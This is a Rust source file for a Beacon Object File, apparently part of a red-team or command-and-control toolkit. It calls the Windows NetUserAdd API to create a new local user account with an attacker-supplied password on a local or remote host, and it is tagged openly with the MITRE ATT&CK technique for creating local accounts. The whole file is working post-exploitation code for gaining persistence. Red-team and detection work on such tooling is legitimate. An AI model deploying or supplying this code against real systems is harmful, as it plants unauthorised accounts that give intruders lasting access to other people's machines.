//! # Add User BOF
//!
//! Adds a new local user account on a target host using NetUserAdd.
//! ## MITRE ATT&CK
//! - T1136.001 - Create Account: Local Account
//!
//! ## Arguments
//! - `str`: Hostname (use `.` for local machine).
//! - `str`: Username to create.
//! - `str`: Password for the new account.

#![no_std]

use rustbof::data::DataParser;
use rustbof::str::to_wide;
use rustbof::{eprintln, println};
use windows_sys::Win32::NetworkManagement::NetManagement::NetUserAdd;

#[repr(C)]
struct UserInfo1 {
    usri1_name: *mut u16,
    usri1_password: *mut u16,
    usri1_password_age: u32,
    usri1_priv: u32,
    usri1_home_dir: *mut u16,
    usri1_comment: *mut u16,
    usri1_flags: u32,
    usri1_script_path: *mut u16,
}

const USER_PRIV_USER: u32 = 1;

const UF_SCRIPT: u32 = 0x0001;

const NERR_SUCCESS: u32 = 0;

fn parm_err_field(err: u32) -> &'static str {
    match err {
        0 => "usri1_name",
        1 => "usri1_password",
        2 => "usri1_password_age",
        3 => "usri1_priv",
        4 => "usri1_home_dir",
        5 => "usri1_comment",
        6 => "usri1_flags",
        7 => "usri1_script_path",
        _ => "unknown",
    }
}

#[rustbof::main]
fn main(args: *mut u8, len: usize) {
    let mut parser = DataParser::new(args, len);
    let hostname = alloc::string::String::from(parser.get_str());
    let username = alloc::string::String::from(parser.get_str());
    let password = alloc::string::String::from(parser.get_str());

    let mut server_wide = to_wide(&hostname);
    let mut user_wide = to_wide(&username);
    let mut pass_wide = to_wide(&password);

    let server_ptr = if hostname == "." {
        core::ptr::null()
    } else {
        server_wide.as_mut_ptr()
    };

    let mut info = UserInfo1 {
        usri1_name: user_wide.as_mut_ptr(),
        usri1_password: pass_wide.as_mut_ptr(),
        usri1_password_age: 0,
        usri1_priv: USER_PRIV_USER,
        usri1_home_dir: core::ptr::null_mut(),
        usri1_comment: core::ptr::null_mut(),
        usri1_flags: UF_SCRIPT,
        usri1_script_path: core::ptr::null_mut(),
    };

    let mut parm_err: u32 = 0;

    let status = unsafe {
        NetUserAdd(
            server_ptr,
            1,
            &mut info as *mut _ as *const u8,
            &mut parm_err,
        )
    };

    if status == NERR_SUCCESS {
        println!("Successfully added user '{}' on '{}'.", username, hostname);
    } else {
        eprintln!(
            "NetUserAdd failed with error {}: parm_err={} ({})",
            status,
            parm_err,
            parm_err_field(parm_err)
        );
    }
}
